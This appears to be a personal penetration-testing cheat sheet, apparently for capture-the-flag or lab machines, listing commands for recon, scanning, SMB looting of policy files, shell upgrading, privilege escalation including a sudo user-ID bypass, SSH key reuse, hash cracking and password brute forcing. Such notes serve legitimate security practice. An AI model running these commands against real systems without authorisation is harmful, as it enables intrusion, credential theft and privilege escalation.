# step by step

## recon
ping {ip}
whois {domain}
nslookup {ip}
dig {ip}
host {domain}

## target scanning
sudo nmap --open #-p- for full port scan #-sV version detection #-sC default scripts #-Pn host discovery

subfinder -d {domain}
dnsgen urls.lst | httprobe
httpx
whatweb

## remote exploits
### http/https
if seeing any url with a number change the number

### ftp
ftp anonymous@{IP}

### smb
smbmap -H {IP} #list shares on target with anomouse
smbmap -H {IP} -u {username} #guest/administrator
smbclient -L={IP} -U Administrator #try a login
smbclient //{IP}/{sharename} #connect to specifiec share
RECURSE ON
PROMPT OFF
cd {dir}
mget /Policies/*/MACHINE/Preferences/Groups/Groups.xml
mget *

### psql
psql -U {USER} -h {IP} -p 5432
\l #list databases
\c {name} #connect to a database
\dt #list tables
select * from {table} #show table content

### finding github source
when finding the source code,
compare the changes,
sometimes in this there might be found the difference

## getting connections
ssh {user}@{ip}
xfreerdp /v:{IP} /u:{USER} /p:{PASSWORD}
telnet {ip} {port}

### basic shell -> shell++
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
```
script /dev/null -c bash
```
ctrl+Z and then
```
stty raw -echo && fg
```

### recon from a shell
whoami
id #default groups: audio video plugdev cdrom dip floppy netdev
groups
cat .bash_history
uname -a

ss -tln #identify localports
ss -tla #identify name

find / -user root -perm /4000 2>/dev/null
find / -type f -perm -04000 -ls 2>/dev/null #find tools that have an suid, look these up on https://gtfobins.github.io/

pspy32 #spy tool, open it on a host, login on second terminal, and maybe gain stuff

cd C:\Program Files (x86)
dir

PrivescCheck.ps1

### sudo -L
https://gtfobins.github.io/#+sudo
sudo -u#-1 /bin/bash

### ls *.ssh/ 
look for keys and try to login with them to other users
ssh {user}@{ip} -i {keyfile}

#### pgp key decryption
gpg2john {file}.asc > hash
john --format=gpg --wordlist=/usr/share/wordlist/rockyou.txt hash
gpg --import {file}.asc
gpg --decrypt {file}.gpg


## cracking hashes
zip2john file.zip>{hashfile}
john {hashfile}
john {hashfile} --show

hashcat -a 0 -m 20 {hashfile} /usr/share/wordlists/rockyou.txt

## brute forcing
hydra -L users.txt -P pass.txt {IP} ssh
hydra -l mike -P /usr/share/wordlists/rockyou.txt -vV {ip} ftp

gobuster dir --url {ip} --wordlist /usr/share/wordlists/dirb/big.txt
gobuster dns -d {domain} --wordlist /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt

feroxbuster -u {ip}

ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://{domain}/ -H "HOST:FUZZ.{domain}" -fw 1 #vhost
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://{domain} -H 'Host: FUZZ.{domain}' -fw 4 -t 100
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FFUZ -u http://{domain} -H 'Host: http://{domain}/FFUZ' -ic -t 100


